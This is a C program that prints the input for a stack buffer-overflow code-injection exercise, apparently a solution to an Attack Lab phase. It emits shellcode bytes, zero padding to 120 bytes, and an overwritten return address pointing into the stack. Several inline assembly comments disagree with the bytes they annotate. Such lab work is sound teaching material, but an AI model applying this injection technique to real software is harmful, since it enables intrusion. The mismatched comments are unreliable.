#include<stdio.h>
#include<string.h>

void input_string(char* dest, const char* src, int* p_i)
{
	strcpy(dest + *p_i, src);
	*p_i += strlen(src);
	return;
}

int main()
{
	char print[300];
	int index = 0;

	input_string(print, "49 c7 c4 00 00 00 00 ", &index);//	mov    $0x0,%r12
	input_string(print, "48 c7 c7 88 dc 61 55 ", &index);// mov    $0x5561dc90,%rdi
	input_string(print, "48 bd 35 39 62 39 39 37 66 61 ", &index);//	mov    $0x59b997fa,%rbp
	input_string(print, "68 fa 18 40 00 ", &index);//	push $0x4018fa
	input_string(print, "c3 ", &index);// ret


	while(index < 120) 
	{
		input_string(print, "00 ", &index);
	}
	
	// goto injected code
	input_string(print, "78 dc 61 55", &index);
	printf("%s", print);
	return 0;
}
